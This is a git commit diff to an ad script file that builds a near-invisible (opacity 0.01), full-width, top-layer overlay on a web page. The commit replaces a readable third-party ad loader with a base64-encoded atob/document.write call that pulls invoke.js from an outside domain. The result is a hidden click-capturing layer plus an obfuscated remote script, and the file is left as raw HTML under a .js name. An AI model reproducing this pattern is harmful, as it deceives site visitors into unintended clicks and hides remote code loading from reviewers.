768195e3d885dd4b8f2611e1c4ff55973aebe985
DayB4r <nitans404@gmail.com>
2025-09-07 00:37:34 +0700

    Update adfolatopsv2.js

--- ad/adfolatopsv2.js
+++ ad/adfolatopsv2.js
@@ -1,17 +1,7 @@
-document.write('<div id="floatads" style="width:100%;margin:auto; text-align:center;float:none;overflow:hidden; display:scroll;position:fixed; top:0;z-index:9999;opacity:0.01">');
-document.write('<div style="text-align:center;display:block;max-width:729px;height:auto;overflow:hidden;margin:auto;">');
+<div id="floatads" style="width:100%;margin:auto; text-align:center;float:none;overflow:hidden; display:scroll;position:fixed; top:0;z-index:9999;opacity:0.01">
+<div style="text-align:center;display:block;max-width:729px;height:auto;margin:auto;">
 
-<script type="text/javascript">
-	atOptions = {
-		'key' : 'b7de6d42176768af896d8cf77e8f7bb7',
-		'format' : 'iframe',
-		'height' : 90,
-		'width' : 728,
-		'params' : {}
-	};
-</script>
-<script type="text/javascript" src="//chordbelievingpossible.com/b7de6d42176768af896d8cf77e8f7bb7/invoke.js"></scr' + 'ipt>');
+<script>document.write(atob("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJYXRPcHRpb25zID0gewoJCSdrZXknIDogJ2I3ZGU2ZDQyMTc2NzY4YWY4OTZkOGNmNzdlOGY3YmI3JywKCQknZm9ybWF0JyA6ICdpZnJhbWUnLAoJCSdoZWlnaHQnIDogOTAsCgkJJ3dpZHRoJyA6IDcyOCwKCQkncGFyYW1zJyA6IHt9Cgl9Owo8L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLy9jaG9yZGJlbGlldmluZ3Bvc3NpYmxlLmNvbS9iN2RlNmQ0MjE3Njc2OGFmODk2ZDhjZjc3ZThmN2JiNy9pbnZva2UuanMiPjwvc2NyaXB0Pg=="));</script>
 
-document.write('</div>');
-document.write('</div>');
-
+	</div>
+	</div>
